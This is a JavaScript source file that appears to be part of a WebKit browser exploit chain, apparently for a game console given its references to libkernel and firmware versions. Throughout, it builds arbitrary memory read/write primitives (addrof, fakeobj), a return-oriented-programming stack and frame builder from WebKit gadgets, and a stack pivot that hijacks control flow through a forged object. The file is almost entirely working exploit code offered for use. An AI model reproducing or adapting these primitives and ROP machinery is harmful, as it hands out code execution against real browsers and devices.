//#region Constants
const fn = {};
const structs = new Map();
const syscalls = new Map();

let _error_addr = undefined;
let strerror_addr = undefined;

let webkit_base = undefined;
let libc_base = undefined;
let libkernel_base = undefined;

const mem = {
  allocs: new Set(),
  alloc(len, ptr = true) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return ptr ? ab.data() : ab;
  },
  free(ab) {
    return this.allocs.delete(ab);
  },
  free_all() {
    for (const ab of this.allocs) {
      if (ab.hasOwnProperty("m_data")) {
        const ab_addr = arw.addrof(ab);

        let m_impl = arw.view(ab_addr).getBInt(0x10, true);

        if (version.major === 6) {
          m_impl = m_impl.xor(g_JSArrayBufferPoison);
        }

        arw.view(m_impl).setBInt(0, 0, true); 
        arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true); 

        if (version.major === 9) {
          arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        } else {
          arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        }
      }
    }

    this.allocs.clear();
  },
  copy(dst, src, len) {
    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));

    dst_u8.set(src_u8);
  },
  bset(addr, len, value = 0) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));
    u8.fill(value);
  },
  strlen(addr, max = 0x3fff) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));

    const len = u8.indexOf(0);
    if (len === -1) {
      throw new Error("Invalid null-terminated string !!");
    }

    return len;
  },
};

const arw = {
  leak: { obj: 0 },
  leak_addr: undefined,
  master: undefined,
  victim: new DataView(new ArrayBuffer(0x30)),
  view(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    this.master[4] = addr.lo;
    this.master[5] = addr.hi;

    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBInt(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setBInt(0x10, addr, true);
    return this.leak.obj;
  },
};

const rop = {
  stack: undefined,
  frame: undefined,
  pivot: undefined,
  insts: [],
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  execute() {
    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);

    this.stack.prepare(this.insts, this.frame);
    this.pivot.prepare(this.stack.sp);

    const pivot_obj = {};
    const pivot_obj_addr = arw.addrof(pivot_obj);

    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);

    const pivot_addr = this.pivot.addr;
    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);

    Math.expm1(pivot_obj);

    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);
  },
};

const gadgets = new Proxy(constants, {
  get(target, prop) {
    return webkit_base + target[`wk_${prop}`];
  },
});
//#endregion

//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}

class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.view = new DataView(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
    this.offset = this.view.byteLength;
  }

  get sp() {
    return this.view.buffer.data().add(this.offset);
  }

  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.current < 1) {
        throw new Error("Stack full !!");
      }

      let inst = insts[i];

      if (typeof inst === "string") {
        if (typeof frame === "undefined") {
          throw new Error("Unable to resolve symbol without frame !!");
        }

        inst = frame.instof(inst);
      }

      this.offset -= 8;
      this.view.setBInt(this.offset, inst, true);
    }
  }
}

class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame length !!");
    }

    this.pop_view = new DataView(new ArrayBuffer(8));
    this.view = new DataView(new ArrayBuffer(list.length * 8));

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
  }

  instof(name) {
    let as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.data().add(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.getBInt(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view.setBInt(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RAX_RET);
    insts.push(gadget);
    insts.push(gadgets.POP_RDI_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    insts.push(gadgets.POP_RBX_RET);
    insts.push(name);
    insts.push(gadgets.POP_RAX_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);
  }
}

class Pivot {
  constructor() {
    this.store_view = new DataView(new ArrayBuffer(constants.store_view_size));
    this.pivot_view = new DataView(new ArrayBuffer(0x28));

    this.store_view.setBInt(constants.store_view_entry, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);
    this.store_view.setBInt(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
    this.store_view.setBInt(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);

    if (version.major === 6 && version.minor <= 0x20) {
      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
    } else {
      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
    }
  }

  get addr() {
    return this.store_view.buffer.data();
  }

  prepare(sp) {
    this.store_view.setBInt(8, this.pivot_view.buffer.data(), true);

    this.pivot_view.setBInt(0, this.pivot_view.buffer.data(), true);
    
    // استكمال كود حجز مساحة الـ Stack Pivot لربط المعالج بمؤشر المكدس sp
    this.pivot_view.setBInt(constants.pivot_view_sp, sp, true);
  }
}
//#endregion
